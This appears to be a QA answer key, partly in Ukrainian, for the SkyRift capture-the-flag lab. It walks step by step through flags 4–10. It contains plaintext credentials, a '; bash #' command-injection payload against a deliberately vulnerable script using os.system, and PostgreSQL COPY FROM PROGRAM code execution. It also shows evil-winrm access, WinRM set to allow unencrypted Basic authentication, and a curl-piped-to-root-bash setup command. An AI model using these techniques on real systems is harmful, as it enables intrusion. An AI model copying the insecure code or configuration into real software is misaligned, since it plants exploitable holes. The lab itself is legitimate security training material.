# QA Commands — SkyRift CTF

---

## Flag_4 — SSH вхід на Operator_station (з Kali)

Якщо помилка "known_hosts":
```
ssh-keygen -f "/home/rangeadmin/.ssh/known_hosts" -R "192.168.125.55"
```

Підключення:
```
ssh -o HostKeyAlgorithms=+ssh-rsa operator@192.168.125.55
```
пароль: `3edcVFR456`

Флаг з'явиться в MOTD при вході. Або:
```
cat /etc/motd
```

---

## Flag_5 — Command injection через sudo (Operator_station)

Переглянути вразливий скрипт:
```
cat /opt/dronecorp/tools/flight_log_export.py
```

Запустити і зробити injection:
```
sudo -u commador /opt/dronecorp/tools/flight_log_export.py
```
Ввести: `; bash #`

Флаг у docstring скрипта:
```
cat /opt/dronecorp/tools/flight_log_export.py
```

---

## Flag_6 — DB credentials (з commador shell)

```
cat /home/commador/scripts/backup_db.sh
```

---

## Flag_7 — PostgreSQL system_config (з commador shell)

Встановити psql якщо нема:
```
sudo apt install -y postgresql-client-14
```

Підключення:
```
psql -h 10.10.50.100 -U tech2 -d dronecorp_db
```
пароль: `adfGt54DCf`

Переглянути таблиці:
```
\dt
```

Знайти флаг:
```
SELECT config_key, config_val FROM system_config;
```

Демонстрація RCE (COPY FROM PROGRAM):
```
CREATE TABLE cmd_exec (output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

Вийти:
```
\q
```

---

## Flag_8 — SMB анонімний доступ (з Operator_station, commador shell)

Встановити smbclient якщо нема:
```
sudo apt install -y smbclient
```

Переглянути шари:
```
smbclient -L //10.10.50.150 -N
```

Підключитись до Updates:
```
smbclient //10.10.50.150/Updates -N
```

Всередині smbclient:
```
ls
lcd /tmp
get deploy_update.ps1
exit
```

Прочитати файл — флаг у першому рядку:
```
cat /tmp/deploy_update.ps1
```

---

## Flag_9 + Flag_10 — Windows Server через evil-winrm (з Operator_station, commador shell)

Встановити evil-winrm якщо нема:
```
sudo apt install -y libreadline-dev ruby-dev ruby-full && sudo gem install evil-winrm --no-document
```

Підключення (одинарні лапки для пароля!):
```
evil-winrm -i 10.10.50.150 -u svc_deploy -p 'Deploy@2024!Drone'
```

Всередині evil-winrm — Flag_9 (в admin_notes.txt):
```
type C:\Users\Administrator\Documents\admin_notes.txt
```

Flag_10 (реєстр):
```
reg query HKLM\SOFTWARE\DroneCorp\UpdateSync
```

Знайти unquoted service path:
```
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"
```

Перевірити права на запис:
```
icacls "C:\Program Files"
```

---

## Windows Server — ручне налаштування (якщо не запускався скрипт)

Виконати на Windows Server (PowerShell як Administrator):

Створити svc_deploy:
```
secedit /export /cfg C:\secpol.cfg
(Get-Content C:\secpol.cfg) -replace "PasswordComplexity = 1","PasswordComplexity = 0" | Set-Content C:\secpol.cfg
secedit /configure /db C:\Windows\security\local.sdb /cfg C:\secpol.cfg /areas SECURITYPOLICY
net user svc_deploy "Deploy@2024!Drone" /add /y
net localgroup "Remote Management Users" svc_deploy /add
net localgroup "Users" svc_deploy /add
```

Увімкнути WinRM:
```
winrm quickconfig -force
netsh advfirewall firewall add rule name="WinRM" dir=in action=allow protocol=TCP localport=5985
winrm set winrm/config/service/auth '@{Basic="true"}'
winrm set winrm/config/service '@{AllowUnencrypted="true"}'
```

---

## DB сервер — патч Flag_7 (якщо не запускався скрипт)

Виконати на DB сервері (10.10.50.100) як root:
```
curl -s https://raw.githubusercontent.com/rifatismailov/skyrift-ctf-setup/main/setup_scripts/02b_db_patch_flag7.sh | sudo bash
```

---

## Operator_station — патч Flag_5 (якщо скрипт не запускався)

```
cat > /opt/dronecorp/tools/flight_log_export.py << 'EOF'
#!/usr/bin/env python3
"""
DroneCorp — Flight Log Export Utility v1.2
Exports drone flight logs to the commander's export directory.
Usage: sudo -u commador /opt/dronecorp/tools/flight_log_export.py

# flag{Y0u_l1ke_privileges}
"""
import os
import sys

EXPORT_DIR = "/home/commador/exports"
LOG_DIR = "/var/log/dronecorp"

print("=== DroneCorp Flight Log Export Utility ===")
print(f"Log source : {LOG_DIR}")
print(f"Destination: {EXPORT_DIR}")
print()

log_name = input("Enter log filename to export (e.g. DRONE042_export.log): ").strip()

if not log_name:
    print("Error: no filename provided.")
    sys.exit(1)

cmd = f"cp {LOG_DIR}/{log_name} {EXPORT_DIR}/"
print(f"[*] Running: {cmd}")
os.system(cmd)
print("[+] Export complete.")
EOF
```
